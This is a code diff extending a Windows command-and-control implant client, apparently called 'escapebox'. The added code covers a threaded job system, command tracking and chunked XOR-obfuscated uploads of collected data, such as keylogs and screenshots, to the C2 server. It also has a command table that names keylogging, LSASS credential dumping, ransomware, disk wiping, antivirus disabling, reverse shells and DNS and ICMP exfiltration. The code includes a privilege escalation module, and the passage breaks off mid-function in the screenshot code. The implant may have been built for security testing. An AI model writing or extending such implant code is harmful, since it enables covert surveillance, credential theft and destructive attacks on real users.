@@ -3,6 +3,9 @@
 
 #define _CRT_SECURE_NO_WARNINGS
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
+#ifndef PW_RENDERFULLCONTENT
+#define PW_RENDERFULLCONTENT 0x00000002
+#endif
 #include <windows.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
@@ -15,6 +18,11 @@
 #include <string>
 #include <vector>
 #include <mutex>
+#include <queue>
+#include <condition_variable>
+#include <atomic>
+#include <functional>
+#include <map>
 #include <thread>
 #include <chrono>
 #include <fstream>
@@ -33,6 +41,77 @@
 // Include shared definitions from main file
 extern std::string xorEncrypt(const std::string& data, const std::string& key);
 extern void logActivity(const std::string& category, const std::string& type, const std::string& message);
+
+// Local client logging with file persistence
+void logClientActivity(const std::string& category, const std::string& type, const std::string& message) {
+    // Get current time
+    auto now = std::chrono::system_clock::now();
+    auto time_t = std::chrono::system_clock::to_time_t(now);
+    auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()) % 1000;
+    
+    struct tm timeinfo;
+    if (localtime_s(&timeinfo, &time_t) == 0) {
+        char timeStr[100];
+        strftime(timeStr, sizeof(timeStr), "%Y-%m-%d %H:%M:%S", &timeinfo);
+        
+        // Color coding for different log types
+        std::string colorCode = "";
+        if (category == "ERROR") colorCode = "\033[1;31m";      // Bright Red
+        else if (category == "SUCCESS") colorCode = "\033[1;32m"; // Bright Green
+        else if (category == "WARNING") colorCode = "\033[1;33m"; // Bright Yellow
+        else if (category == "CLIENT_DEBUG") colorCode = "\033[1;36m"; // Bright Cyan
+        else if (category == "CMD_TRACKER") colorCode = "\033[1;35m";  // Bright Magenta
+        else if (category == "CMD_STATUS") colorCode = "\033[1;34m";   // Bright Blue
+        else if (category == "REALTIME_STATUS") colorCode = "\033[1;37m"; // Bright White
+        else colorCode = "\033[0m"; // Reset
+        
+        // Clean, human-readable console output (ASCII-safe)
+        if (category == "CMD_TRACKER" && type == "CMD_RECEIVED") {
+            std::cout << "\n[>> COMMAND RECEIVED] " << message << std::endl;
+        }
+        else if (category == "CMD_TRACKER" && type == "COMPLETED") {
+            std::cout << "[OK COMPLETED] " << message << std::endl;
+        }
+        else if (category == "CMD_TRACKER" && type == "FAILED") {
+            std::cout << "[!! FAILED] " << message << std::endl;
+        }
+        else if (category == "COLLECTION") {
+            std::cout << "[** COLLECTION] " << message << std::endl;
+        }
+        else if (category == "REALTIME_STATUS") {
+            std::cout << "[## STATUS] " << message << std::endl;
+        }
+        else if (category == "*** XDR_ALERT ***") {
+            std::cout << "[ALERT] " << message << std::endl;
+        }
+        else if (category != "CLIENT_DEBUG") {
+            // Show important non-debug messages with simplified format
+            std::cout << "[" << category << "] " << message << std::endl;
+        }
+        // Skip CLIENT_DEBUG messages for cleaner output
+                  
+        // Persistent file logging for all client activities
+        std::ofstream logFile("C:\\temp\\c2_client_activity.txt", std::ios::app);
+        if (logFile.is_open()) {
+            logFile << "[" << timeStr << "." << std::setfill('0') << std::setw(3) << ms.count() 
+                    << "] [" << category << "] [" << type << "] " << message << std::endl;
+            logFile.close();
+        }
+        
+        // Special persistent logging for command tracking and status
+        if (category == "CMD_TRACKER" || category == "CMD_STATUS" || category == "REALTIME_STATUS") {
+            std::ofstream cmdStatusFile("C:\\temp\\c2_client_status.txt", std::ios::app);
+            if (cmdStatusFile.is_open()) {
+                cmdStatusFile << "[" << timeStr << "." << std::setfill('0') << std::setw(3) << ms.count() 
+                          << "] [" << category << "] [" << type << "] " << message << std::endl;
+                cmdStatusFile.close();
+            }
+        }
+    }
+    
+    // Also call the original logActivity for compatibility
+    logActivity(category, type, message);
+}
 
 // Include privilege escalation module
 #include "privilege_escalation.cpp"
@@ -74,6 +153,27 @@ struct C2Packet {
 // Command types are defined in the main file, so we just include a comment here
 // The CommandType enum is already defined in escapebox.cpp
 
+// Command status tracking
+enum CommandStatus {
+    CMD_RECEIVED = 0,
+    CMD_PROCESSING = 1,
+    CMD_COMPLETED = 2,
+    CMD_FAILED = 3,
+    CMD_TIMEOUT = 4
+};
+
+struct TrackedCommand {
+    std::string commandId;
+    std::string commandType;
+    std::string fullCommand;
+    CommandStatus status;
+    std::chrono::steady_clock::time_point receivedTime;
+    std::chrono::steady_clock::time_point startTime;
+    std::chrono::steady_clock::time_point endTime;
+    std::string result;
+    std::string errorMessage;
+};
+
 class C2Client {
 private:
     SOCKET serverSocket;
@@ -87,6 +187,34 @@ private:
     std::vector<std::string> keylogBuffer;
     std::mutex keylogMutex;
     bool autoElevate;
+    
+    // Multi-threading job system
+    struct Job {
+        std::string jobId;
+        std::string commandId;
+        int cmdType;
+        std::string params;
+        std::chrono::steady_clock::time_point startTime;
+        std::function<void()> task;
+    };
+    
+    std::queue<Job> jobQueue;
+    std::mutex jobQueueMutex;
+    std::condition_variable jobCondition;
+    std::vector<std::thread> workerThreads;
+    std::atomic<bool> shutdownThreads{false};
+    std::atomic<int> activeJobs{0};
+    std::mutex activeJobsMutex;
+    std::map<std::string, std::string> jobStatus; // jobId -> status
+    const int NUM_WORKER_THREADS = 4;
+    
+    // Command tracking
+    std::vector<TrackedCommand> commandHistory;
+    std::mutex commandTrackingMutex;
+    std::string currentCommandId;
+    int commandCounter = 0;
+    std::thread statusDisplayThread;
+    bool showRealtimeStatus = true;
     
     // Client info
     std::string hostname;
@@ -107,6 +235,15 @@ public:
     }
     
     ~C2Client() {
+        // Shutdown job system
+        shutdownJobSystem();
+        
+        // Stop real-time status display
+        showRealtimeStatus = false;
+        if (statusDisplayThread.joinable()) {
+            statusDisplayThread.join();
+        }
+        
         if (keyloggerActive) {
             keyloggerActive = false;
             if (keyloggerThread.joinable()) {
@@ -115,6 +252,414 @@ public:
         }
         if (serverSocket != INVALID_SOCKET) {
             closesocket(serverSocket);
+        }
+    }
+    
+    // Multi-threading job system methods
+    void initializeJobSystem() {
+        logClientActivity("THREADING", "INIT", "Initializing job system with " + std::to_string(NUM_WORKER_THREADS) + " worker threads");
+        
+        shutdownThreads = false;
+        activeJobs = 0;
+        
+        // Start worker threads
+        for (int i = 0; i < NUM_WORKER_THREADS; ++i) {
+            workerThreads.emplace_back(&C2Client::workerThreadFunction, this, i);
+        }
+        
+        logClientActivity("THREADING", "READY", "Job system initialized successfully");
+    }
+    
+    void shutdownJobSystem() {
+        logClientActivity("THREADING", "SHUTDOWN", "Shutting down job system");
+        
+        // Signal shutdown
+        shutdownThreads = true;
+        
+        // Wake up all worker threads
+        jobCondition.notify_all();
+        
+        // Wait for all worker threads to finish
+        for (auto& thread : workerThreads) {
+            if (thread.joinable()) {
+                thread.join();
+            }
+        }
+        
+        // Clear remaining jobs
+        {
+            std::lock_guard<std::mutex> lock(jobQueueMutex);
+            while (!jobQueue.empty()) {
+                jobQueue.pop();
+            }
+            jobStatus.clear();
+        }
+        
+        logClientActivity("THREADING", "COMPLETE", "Job system shutdown complete");
+    }
+    
+    void workerThreadFunction(int threadId) {
+        logClientActivity("THREADING", "WORKER_START", "Worker thread " + std::to_string(threadId) + " started");
+        
+        while (!shutdownThreads) {
+            Job currentJob;
+            bool hasJob = false;
+            
+            // Wait for a job
+            {
+                std::unique_lock<std::mutex> lock(jobQueueMutex);
+                jobCondition.wait(lock, [this] { return !jobQueue.empty() || shutdownThreads; });
+                
+                if (shutdownThreads && jobQueue.empty()) {
+                    break;
+                }
+                
+                if (!jobQueue.empty()) {
+                    currentJob = std::move(jobQueue.front());
+                    jobQueue.pop();
+                    hasJob = true;
+                    
+                    // Update job status
+                    jobStatus[currentJob.jobId] = "RUNNING";
+                    activeJobs++;
+                }
+            }
+            
+            if (hasJob) {
+                logClientActivity("THREADING", "JOB_START", "Thread " + std::to_string(threadId) + 
+                    " executing job " + currentJob.jobId + " (Command: " + currentJob.commandId + ")");
+                
+                try {
+                    // Execute the job
+                    currentJob.task();
+                    
+                    // Update job status
+                    {
+                        std::lock_guard<std::mutex> lock(jobQueueMutex);
+                        jobStatus[currentJob.jobId] = "COMPLETED";
+                    }
+                    
+                    auto duration = std::chrono::steady_clock::now() - currentJob.startTime;
+                    auto durationMs = std::chrono::duration_cast<std::chrono::milliseconds>(duration).count();
+                    
+                    logClientActivity("THREADING", "JOB_COMPLETE", "Thread " + std::to_string(threadId) + 
+                        " completed job " + currentJob.jobId + " in " + std::to_string(durationMs) + "ms");
+                    
+                } catch (const std::exception& e) {
+                    logClientActivity("THREADING", "JOB_ERROR", "Thread " + std::to_string(threadId) + 
+                        " job " + currentJob.jobId + " failed: " + e.what());
+                    
+                    {
+                        std::lock_guard<std::mutex> lock(jobQueueMutex);
+                        jobStatus[currentJob.jobId] = "FAILED";
+                    }
+                } catch (...) {
+                    logClientActivity("THREADING", "JOB_ERROR", "Thread " + std::to_string(threadId) + 
+                        " job " + currentJob.jobId + " failed with unknown error");
+                    
+                    {
+                        std::lock_guard<std::mutex> lock(jobQueueMutex);
+                        jobStatus[currentJob.jobId] = "FAILED";
+                    }
+                }
+                
+                activeJobs--;
+            }
+        }
+        
+        logClientActivity("THREADING", "WORKER_END", "Worker thread " + std::to_string(threadId) + " terminated");
+    }
+    
+    std::string addJob(const std::string& commandId, int cmdType, const std::string& params, std::function<void()> task) {
+        std::string jobId = "JOB_" + std::to_string(commandCounter++) + "_" + std::to_string(GetTickCount());
+        
+        Job newJob;
+        newJob.jobId = jobId;
+        newJob.commandId = commandId;
+        newJob.cmdType = cmdType;
+        newJob.params = params;
+        newJob.startTime = std::chrono::steady_clock::now();
+        newJob.task = task;
+        
+        {
+            std::lock_guard<std::mutex> lock(jobQueueMutex);
+            jobQueue.push(newJob);
+            jobStatus[jobId] = "QUEUED";
+        }
+        
+        jobCondition.notify_one();
+        
+        logClientActivity("THREADING", "JOB_QUEUED", "Added job " + jobId + " for command " + commandId + 
+            " (Queue size: " + std::to_string(jobQueue.size()) + ")");
+        
+        return jobId;
+    }
+    
+    std::string getJobStatus(const std::string& jobId) {
+        std::lock_guard<std::mutex> lock(jobQueueMutex);
+        auto it = jobStatus.find(jobId);
+        return (it != jobStatus.end()) ? it->second : "NOT_FOUND";
+    }
+    
+    int getActiveJobCount() {
+        return activeJobs.load();
+    }
+    
+    int getQueuedJobCount() {
+        std::lock_guard<std::mutex> lock(jobQueueMutex);
+        return static_cast<int>(jobQueue.size());
+    }
+    
+    // Enhanced command description mapping
+    std::string getEnhancedCommandDescription(const std::string& commandType, const std::string& fullCommand) {
+        // For packet commands, map the command ID to descriptive names
+        if (commandType.find("PACKET_CMD_") == 0) {
+            int cmdId = 0;
+            try {
+                cmdId = std::stoi(commandType.substr(11)); // Extract number after "PACKET_CMD_"
+            } catch (...) {
+                return commandType + " (Invalid Command ID)";
+            }
+            
+            switch (cmdId) {
+                case 1: return "HEARTBEAT_BEACON - Connection keepalive signal (T1071.001 Application Layer Protocol)";
+                case 2: return "CONNECTION_HEARTBEAT - Network connectivity check (T1071.001 Application Layer Protocol)";
+                case 16: return "SYSTEM_INFO_COLLECTION - Gathering host information (T1082 System Information Discovery)";
+                case 17: return "PROCESS_ENUMERATION - Listing running processes (T1057 Process Discovery)";
+                case 18: return "NETWORK_CONFIGURATION_DISCOVERY - Network interface scan (T1016 System Network Configuration Discovery)";
+                case 19: return "USER_ACCOUNT_ENUMERATION - Local user discovery (T1033 System Owner/User Discovery)";
+                case 20: return "DOMAIN_INFORMATION_GATHERING - Active Directory reconnaissance (T1018 Remote System Discovery)";
+                case 21: return "SOFTWARE_DISCOVERY - Installed programs enumeration (T1518 Software Discovery)";
+                case 32: return "SCREENSHOT_CAPTURE - Desktop surveillance (T1113 Screen Capture)";
+                case 33: return "KEYLOGGER_ACTIVATION - Keystroke monitoring start (T1056.001 Keylogging)";
+                case 34: return "KEYLOGGER_DATA_RETRIEVAL - Keylog buffer extraction (T1056.001 Keylogging)";
+                case 35: return "CLIPBOARD_DATA_COLLECTION - Clipboard contents theft (T1115 Clipboard Data)";
+                case 36: return "BROWSER_CREDENTIAL_THEFT - Password extraction";
+                case 37: return "FILE_SYSTEM_SEARCH - Sensitive file hunting";
+                case 38: return "WEBCAM_SURVEILLANCE - Camera activation";
+                case 39: return "AUDIO_RECORDING - Microphone surveillance";
+                case 40: return "SCREEN_RECORDING - Video capture";
+                case 48: return "COMMAND_SHELL_EXECUTION - Shell command execution";
+                case 49: return "POWERSHELL_SCRIPT_EXECUTION - PowerShell payload";
+                case 50: return "MALICIOUS_PROCESS_INJECTION - Code injection attack";
+                case 51: return "DYNAMIC_MODULE_LOADING - DLL loading";
+                case 52: return "PROCESS_MIGRATION - Process switching";
+                case 53: return "REVERSE_SHELL_CONNECTION - Backdoor establishment";
+                case 54: return "REMOTE_DESKTOP_ACCESS - RDP activation";
+                case 64: return "MALICIOUS_SERVICE_INSTALLATION - Service persistence";
+                case 65: return "REGISTRY_PERSISTENCE_MECHANISM - Registry modification";
+                case 66: return "SCHEDULED_TASK_PERSISTENCE - Task scheduler abuse";
+                case 67: return "WMI_EVENT_PERSISTENCE - WMI backdoor";
+                case 68: return "STARTUP_FOLDER_PERSISTENCE - Startup persistence";
+                case 69: return "BOOTKIT_INSTALLATION - Boot sector infection";
+                case 80: return "NETWORK_PORT_SCANNING - Port discovery";
+                case 81: return "SMB_SHARE_ENUMERATION - Network share discovery";
+                case 82: return "PSEXEC_LATERAL_MOVEMENT - Remote execution";
+                case 83: return "WMI_REMOTE_EXECUTION - WMI lateral movement";
+                case 84: return "RDP_LATERAL_MOVEMENT - RDP hijacking";
+                case 85: return "PASS_THE_HASH_ATTACK - Credential relay";
+                case 86: return "MIMIKATZ_CREDENTIAL_DUMP - Memory credential extraction";
+                case 96: return "UAC_BYPASS_EXPLOITATION - Privilege escalation";
+                case 97: return "ACCESS_TOKEN_THEFT - Token manipulation";
+                case 98: return "PRIVILEGE_ESCALATION_ENUMERATION - Exploit discovery";
+                case 99: return "LSASS_MEMORY_DUMP - Credential dumping";
+                case 100: return "SAM_DATABASE_EXTRACTION - Password hash theft";
+                case 112: return "ANTIVIRUS_DISABLING - Security bypass";
+                case 113: return "EVENT_LOG_CLEARING - Evidence destruction";
+                case 114: return "FILE_TIMESTAMP_MANIPULATION - Anti-forensics";
+                case 115: return "PROCESS_HOLLOWING_INJECTION - Stealth injection";
+                case 116: return "ROOTKIT_INSTALLATION - System compromise";
+                case 117: return "AMSI_BYPASS_TECHNIQUE - PowerShell defense bypass";
+                case 118: return "ETW_LOGGING_DISABLING - Telemetry evasion";
+                case 128: return "DATA_STAGING_FOR_EXFILTRATION - Preparation for theft";
+                case 129: return "DATA_COMPRESSION - Archive creation";
+                case 130: return "HTTP_DATA_EXFILTRATION - Web-based data theft";
+                case 131: return "DNS_TUNNEL_EXFILTRATION - DNS covert channel";
+                case 132: return "ICMP_TUNNEL_EXFILTRATION - ICMP covert channel";
+                case 133: return "EMAIL_DATA_EXFILTRATION - Email-based theft";
+                case 134: return "CLOUD_SERVICE_UPLOAD - Cloud storage abuse";
+                case 144: return "RANSOMWARE_DEPLOYMENT - File encryption attack";
+                case 145: return "DISK_WIPING_ATTACK - Destructive operation";
+                case 146: return "BOOT_SECTOR_CORRUPTION - System destruction";
+                case 147: return "CRYPTOCURRENCY_MINING - Resource hijacking";
+                case 160: return "TOR_NETWORK_CONNECTION - Anonymous networking";
+                case 161: return "TOR_API_COMMUNICATION - Dark web communication";
+                case 162: return "REVERSE_SSH_TUNNEL - Encrypted tunnel";
+                case 163: return "NETCAT_NETWORK_TUNNEL - Network pivoting";
+                case 164: return "SOCAT_NETWORK_RELAY - Advanced tunneling";
+                case 165: return "CRYPTCAT_ENCRYPTED_TUNNEL - Encrypted communication";
+                default: return "UNKNOWN_PACKET_COMMAND_" + std::to_string(cmdId) + " - Unrecognized binary command";
+            }
+        }
+        
+        // For text commands, provide enhanced descriptions
+        if (commandType == "SHELL") return "SHELL_COMMAND - " + fullCommand;
+        if (commandType == "POWERSHELL") return "POWERSHELL_EXECUTION - " + fullCommand;
+        if (commandType == "KEYLOG") return "KEYLOGGER_OPERATION - " + fullCommand;
+        if (commandType == "SCREENSHOT") return "SCREENSHOT_SURVEILLANCE - " + fullCommand;
+        if (commandType == "CAMPAIGN") return "ATTACK_CAMPAIGN - " + fullCommand;
+        if (commandType == "TOR") return "TOR_ANONYMIZATION - " + fullCommand;
+        if (commandType == "SSH") return "SSH_TUNNELING - " + fullCommand;
+        if (commandType == "NETCAT") return "NETCAT_NETWORKING - " + fullCommand;
+        if (commandType == "SOCAT") return "SOCAT_RELAY - " + fullCommand;
+        if (commandType == "TERMINATE") return "CLIENT_TERMINATION - Shutdown command";
+        
+        return commandType + " - " + fullCommand;
+    }
+
+    // Command tracking methods
+    std::string startCommandTracking(const std::string& commandType, const std::string& fullCommand) {
+        std::lock_guard<std::mutex> lock(commandTrackingMutex);
+        
+        std::string cmdId = "CMD_" + std::to_string(++commandCounter) + "_" + std::to_string(GetTickCount());
+        
+        TrackedCommand cmd;
+        cmd.commandId = cmdId;
+        cmd.commandType = commandType;
+        cmd.fullCommand = fullCommand;
+        cmd.status = CMD_RECEIVED;
+        cmd.receivedTime = std::chrono::steady_clock::now();
+        
+        commandHistory.push_back(cmd);
+        currentCommandId = cmdId;
+        
+        // Enhanced logging with descriptive command information
+        std::string enhancedDescription = getEnhancedCommandDescription(commandType, fullCommand);
+        logClientActivity("CMD_TRACKER", "CMD_RECEIVED", "[" + cmdId + "] " + enhancedDescription);
+        
+        return cmdId;
+    }
+    
+    void updateCommandStatus(const std::string& cmdId, CommandStatus status, const std::string& result = "", const std::string& error = "") {
+        std::lock_guard<std::mutex> lock(commandTrackingMutex);
+        
+        for (auto& cmd : commandHistory) {
+            if (cmd.commandId == cmdId) {
+                cmd.status = status;
+                if (status == CMD_PROCESSING) {
+                    cmd.startTime = std::chrono::steady_clock::now();
+                } else if (status == CMD_COMPLETED || status == CMD_FAILED) {
+                    cmd.endTime = std::chrono::steady_clock::now();
+                    if (!result.empty()) cmd.result = result;
+                    if (!error.empty()) cmd.errorMessage = error;
+                }
+                
+                std::string statusStr;
+                switch (status) {
+                    case CMD_RECEIVED: statusStr = "RECEIVED"; break;
+                    case CMD_PROCESSING: statusStr = "PROCESSING"; break;
+                    case CMD_COMPLETED: statusStr = "COMPLETED"; break;
+                    case CMD_FAILED: statusStr = "FAILED"; break;
+                    case CMD_TIMEOUT: statusStr = "TIMEOUT"; break;
+                }
+                
+                std::string enhancedDesc = getEnhancedCommandDescription(cmd.commandType, cmd.fullCommand);
+                logClientActivity("CMD_TRACKER", statusStr, "[" + cmdId + "] " + enhancedDesc + 
+                    (error.empty() ? "" : " - ERROR: " + error));
+                
+                break;
+            }
+        }
+    }
+    
+    void printCommandStatus() {
+        std::lock_guard<std::mutex> lock(commandTrackingMutex);
+        
+        logClientActivity("CMD_STATUS", "QUEUE_SUMMARY", "=== COMMAND QUEUE STATUS ===");
+        logClientActivity("CMD_STATUS", "TOTAL_COMMANDS", "Total commands in history: " + std::to_string(commandHistory.size()));
+        
+        int processing = 0, completed = 0, failed = 0;
+        for (const auto& cmd : commandHistory) {
+            if (cmd.status == CMD_PROCESSING) processing++;
+            else if (cmd.status == CMD_COMPLETED) completed++;
+            else if (cmd.status == CMD_FAILED) failed++;
+        }
+        
+        logClientActivity("CMD_STATUS", "COUNTS", "Processing: " + std::to_string(processing) + 
+            ", Completed: " + std::to_string(completed) + ", Failed: " + std::to_string(failed));
+        
+        // Show last 5 commands
+        logClientActivity("CMD_STATUS", "RECENT_COMMANDS", "=== RECENT COMMANDS ===");
+        size_t startIdx = commandHistory.size() > 5 ? commandHistory.size() - 5 : 0;
+        for (size_t i = startIdx; i < commandHistory.size(); i++) {
+            const auto& cmd = commandHistory[i];
+            std::string statusStr;
+            switch (cmd.status) {
+                case CMD_RECEIVED: statusStr = "RECEIVED"; break;
+                case CMD_PROCESSING: statusStr = "PROCESSING"; break;
+                case CMD_COMPLETED: statusStr = "COMPLETED"; break;
+                case CMD_FAILED: statusStr = "FAILED"; break;
+                case CMD_TIMEOUT: statusStr = "TIMEOUT"; break;
+            }
+            
+            auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
+                std::chrono::steady_clock::now() - cmd.receivedTime).count();
+                
+            std::string enhancedDesc = getEnhancedCommandDescription(cmd.commandType, cmd.fullCommand);
+            logClientActivity("CMD_STATUS", "CMD_DETAIL", "[" + cmd.commandId + "] " + enhancedDesc + 
+                " - " + statusStr + " (" + std::to_string(elapsed) + "ms ago)");
+        }
+        logClientActivity("CMD_STATUS", "END_SUMMARY", "=== END COMMAND STATUS ===");
+    }
+    
+    // Real-time status display thread
+    void realtimeStatusDisplay() {
+        auto lastUpdate = std::chrono::steady_clock::now();
+        
+        while (showRealtimeStatus && connected) {
+            auto now = std::chrono::steady_clock::now();
+            
+            // Update every 15 seconds
+            if (std::chrono::duration_cast<std::chrono::seconds>(now - lastUpdate).count() >= 15) {
+                std::lock_guard<std::mutex> lock(commandTrackingMutex);
+                
+                // Get current status counts
+                int processing = 0, completed = 0, failed = 0, recent = 0;
+                auto cutoff = std::chrono::steady_clock::now() - std::chrono::minutes(5);
+                
+                for (const auto& cmd : commandHistory) {
+                    if (cmd.status == CMD_PROCESSING) processing++;
+                    else if (cmd.status == CMD_COMPLETED) completed++;
+                    else if (cmd.status == CMD_FAILED) failed++;
+                    
+                    if (cmd.receivedTime > cutoff) recent++;
+                }
+                
+                // Create compact status summary with threading info
+                std::string statusSummary = "Status: " + std::to_string(commandHistory.size()) + " total | " +
+                    std::to_string(processing) + " active | " + 
+                    std::to_string(completed) + " done | " + 
+                    std::to_string(failed) + " failed | " +
+                    std::to_string(recent) + " recent (5min) | " +
+                    "Jobs: " + std::to_string(getActiveJobCount()) + " running, " + 
+                    std::to_string(getQueuedJobCount()) + " queued";
+                
+                logClientActivity("REALTIME_STATUS", "LIVE_UPDATE", statusSummary);
+                
+                // Also display prominently in console
+                std::cout << "\n===============================================================================\n";
+                std::cout << "                               CLIENT STATUS                                \n";
+                std::cout << "===============================================================================\n";
+                std::cout << " " << std::left << std::setw(77) << statusSummary << "\n";
+                std::cout << "===============================================================================\n";
+                
+                // Show currently processing commands
+                if (processing > 0) {
+                    for (const auto& cmd : commandHistory) {
+                        if (cmd.status == CMD_PROCESSING) {
+                            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
+                                std::chrono::steady_clock::now() - cmd.startTime).count();
+                            std::string enhancedDesc = getEnhancedCommandDescription(cmd.commandType, cmd.fullCommand);
+                            logClientActivity("REALTIME_STATUS", "ACTIVE_CMD", "[ACTIVE] [" + cmd.commandId + "] " + 
+                                enhancedDesc + " (running " + std::to_string(elapsed) + "s)");
+                        }
+                    }
+                }
+                
+                lastUpdate = now;
+            }
+            
+            std::this_thread::sleep_for(std::chrono::seconds(5));
         }
     }
     
@@ -213,6 +758,11 @@ public:
         
         connected = true;
         
+        // Start real-time status display thread
+        if (showRealtimeStatus && !statusDisplayThread.joinable()) {
+            statusDisplayThread = std::thread(&C2Client::realtimeStatusDisplay, this);
+        }
+        
         // Receive handshake
         char buffer[1024];
         int bytes = recv(serverSocket, buffer, sizeof(buffer) - 1, 0);
@@ -236,28 +786,94 @@ public:
                                (isElevated ? "ADMIN" : "USER") + "|" + machineGuid;
         sendData(clientInfo);
         
+        // Initialize job system after successful connection
+        initializeJobSystem();
+        
         return true;
     }
     
     void sendData(const std::string& data) {
         std::lock_guard<std::mutex> lock(sendMutex);
-        std::string encrypted = xorEncrypt(data, "PaloAltoEscapeRoom");
-        int bytesSent = send(serverSocket, encrypted.c_str(), static_cast<int>(encrypted.size()), 0);
         
-        // Enhanced debug logging
-        logActivity("CLIENT_DEBUG", "DATA_SENT", "Sent " + std::to_string(bytesSent) + " encrypted bytes to server (original: " + std::to_string(data.length()) + " bytes)");
+        // For large data, implement chunking
+        const size_t MAX_CHUNK_SIZE = 8192; // 8KB chunks for better efficiency
+        const std::string CHUNK_SEPARATOR = "\n---CHUNK---\n";
         
-        if (bytesSent == SOCKET_ERROR) {
-            int error = WSAGetLastError();
-            logActivity("CLIENT_DEBUG", "SEND_ERROR", "Socket send error: " + std::to_string(error));
-        } else if (bytesSent < static_cast<int>(encrypted.size())) {
-            logActivity("CLIENT_DEBUG", "PARTIAL_SEND", "Only sent " + std::to_string(bytesSent) + " of " + std::to_string(encrypted.size()) + " bytes");
-        }
-        
-        // Log first 100 chars of data for debugging (if not too sensitive)
-        if (data.find("KEYLOG:") == 0 || data.find("SCREENSHOT:") == 0) {
-            std::string preview = data.length() > 100 ? data.substr(0, 100) + "..." : data;
-            logActivity("CLIENT_DEBUG", "DATA_PREVIEW", "Data type: " + preview.substr(0, preview.find(':')) + " (" + std::to_string(data.length()) + " bytes total)");
+        if (data.length() > MAX_CHUNK_SIZE) {
+            logActivity("CLIENT_DEBUG", "LARGE_DATA_CHUNKING", "Sending large data in chunks - Total size: " + std::to_string(data.length()) + " bytes");
+            
+            size_t totalChunks = (data.length() + MAX_CHUNK_SIZE - 1) / MAX_CHUNK_SIZE;
+            size_t sentChunks = 0;
+            
+            for (size_t offset = 0; offset < data.length(); offset += MAX_CHUNK_SIZE) {
+                size_t chunkSize = (std::min)(MAX_CHUNK_SIZE, data.length() - offset);
+                std::string chunk = data.substr(offset, chunkSize);
+                
+                // Add chunk header
+                std::string chunkHeader = "CHUNK:" + std::to_string(sentChunks + 1) + "/" + std::to_string(totalChunks) + ":" + std::to_string(chunkSize) + "\n";
+                std::string fullChunk = chunkHeader + chunk + CHUNK_SEPARATOR;
+                
+                std::string encrypted = xorEncrypt(fullChunk, "PaloAltoEscapeRoom");
+                int bytesSent = send(serverSocket, encrypted.c_str(), static_cast<int>(encrypted.size()), 0);
+                
+                if (bytesSent == SOCKET_ERROR) {
+                    int error = WSAGetLastError();
+                    if (error == WSAEWOULDBLOCK) {
+                        // Socket would block, wait a bit and retry
+                        logActivity("CLIENT_DEBUG", "CHUNK_SEND_BLOCK", "Socket blocked on chunk " + std::to_string(sentChunks + 1) + ", retrying...");
+                        Sleep(50);
+                        
+                        // Retry the send
+                        bytesSent = send(serverSocket, encrypted.c_str(), static_cast<int>(encrypted.size()), 0);
+                        if (bytesSent == SOCKET_ERROR) {
+                            error = WSAGetLastError();
+                            logActivity("CLIENT_DEBUG", "CHUNK_SEND_ERROR", "Failed to send chunk " + std::to_string(sentChunks + 1) + " after retry - Error: " + std::to_string(error));
+                            return;
+                        }
+                    } else {
+                        logActivity("CLIENT_DEBUG", "CHUNK_SEND_ERROR", "Failed to send chunk " + std::to_string(sentChunks + 1) + " - Error: " + std::to_string(error));
+                        return;
+                    }
+                }
+                
+                if (bytesSent < static_cast<int>(encrypted.size())) {
+                    logActivity("CLIENT_DEBUG", "CHUNK_PARTIAL_SEND", "Partial chunk send: " + std::to_string(bytesSent) + "/" + std::to_string(encrypted.size()));
+                    return;
+                }
+                
+                sentChunks++;
+                logActivity("CLIENT_DEBUG", "CHUNK_SENT", "Sent chunk " + std::to_string(sentChunks) + "/" + std::to_string(totalChunks) + " (" + std::to_string(chunkSize) + " bytes)");
+                
+                // Adaptive delay based on chunk size - less delay for larger chunks
+                Sleep(5);
+            }
+            
+            // Send completion marker
+            std::string completionMarker = "CHUNK:COMPLETE:" + std::to_string(totalChunks) + "\n";
+            std::string encryptedMarker = xorEncrypt(completionMarker, "PaloAltoEscapeRoom");
+            send(serverSocket, encryptedMarker.c_str(), static_cast<int>(encryptedMarker.size()), 0);
+            
+            logActivity("CLIENT_DEBUG", "LARGE_DATA_COMPLETE", "Successfully sent all " + std::to_string(totalChunks) + " chunks");
+        } else {
+            // Small data - send normally
+            std::string encrypted = xorEncrypt(data, "PaloAltoEscapeRoom");
+            int bytesSent = send(serverSocket, encrypted.c_str(), static_cast<int>(encrypted.size()), 0);
+            
+            // Enhanced debug logging
+            logActivity("CLIENT_DEBUG", "DATA_SENT", "Sent " + std::to_string(bytesSent) + " encrypted bytes to server (original: " + std::to_string(data.length()) + " bytes)");
+            
+            if (bytesSent == SOCKET_ERROR) {
+                int error = WSAGetLastError();
+                logActivity("CLIENT_DEBUG", "SEND_ERROR", "Socket send error: " + std::to_string(error));
+            } else if (bytesSent < static_cast<int>(encrypted.size())) {
+                logActivity("CLIENT_DEBUG", "PARTIAL_SEND", "Only sent " + std::to_string(bytesSent) + " of " + std::to_string(encrypted.size()) + " bytes");
+            }
+            
+            // Log first 100 chars of data for debugging (if not too sensitive)
+            if (data.find("KEYLOG:") == 0 || data.find("SCREENSHOT:") == 0) {
+                std::string preview = data.length() > 100 ? data.substr(0, 100) + "..." : data;
+                logActivity("CLIENT_DEBUG", "DATA_PREVIEW", "Data type: " + preview.substr(0, preview.find(':')) + " (" + std::to_string(data.length()) + " bytes total)");
+            }
         }
     }
     
@@ -774,36 +1390,82 @@ public:
         sendResponse("SCREENSHOT:CAPTURING");
         
         // Get screen dimensions
-        int screenX = GetSystemMetrics(SM_CXSCREEN);
-        int screenY = GetSystemMetrics(SM_CYSCREEN);
-        logActivity("CLIENT_DEBUG", "SCREENSHOT_DIMENSIONS", "Screen size: " + std::to_string(screenX) + "x" + std::to_string(screenY));
+        int fullScreenX = GetSystemMetrics(SM_CXSCREEN);
+        int fullScreenY = GetSystemMetrics(SM_CYSCREEN);
         
-        // Create bitmap
-        HDC hScreen = GetDC(NULL);
-        if (!hScreen) {
-            logActivity("CLIENT_DEBUG", "SCREENSHOT_ERROR", "Failed to get screen DC");
-            sendResponse("SCREENSHOT:ERROR:Failed to get screen DC");
+        // Limit screenshot size for more efficient transfer (max 1920x1080)
+        int screenX = (std::min)(fullScreenX, 1920);
+        int screenY = (std::min)(fullScreenY, 1080);
+        
